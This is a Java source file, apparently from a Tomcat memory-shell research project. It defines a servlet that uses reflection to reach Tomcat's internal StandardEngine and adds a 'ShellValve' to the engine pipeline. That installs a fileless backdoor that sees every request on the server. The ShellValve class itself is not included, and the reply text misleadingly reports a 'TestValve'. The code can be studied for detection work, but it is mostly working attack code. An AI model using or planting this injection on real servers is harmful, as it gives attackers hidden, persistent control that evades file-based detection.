package com.tomcatmemshell.valve;

import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet(name = "addEngineValve", value = "/addEngineValve")
public class AddEngineValve extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            Field fieldRequest = request.getClass().getDeclaredField("request");
            fieldRequest.setAccessible(true);
            Request req = (Request) fieldRequest.get(request);
            // 获取 StandardContext
            StandardContext standardContext = (StandardContext) req.getContext();
            // 获取 StandardHost
            StandardHost standardHost = (StandardHost) standardContext.getParent();
            // 获取 StandardEngine
            StandardEngine standardEngine = (StandardEngine) standardHost.getParent();
            // 添加自定义的 valve
//            standardEngine.getPipeline().addValve(new TestValve());
            standardEngine.getPipeline().addValve(new ShellValve());
            response.getWriter().write("add TestValve successful...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doGet(request, response);
    }
}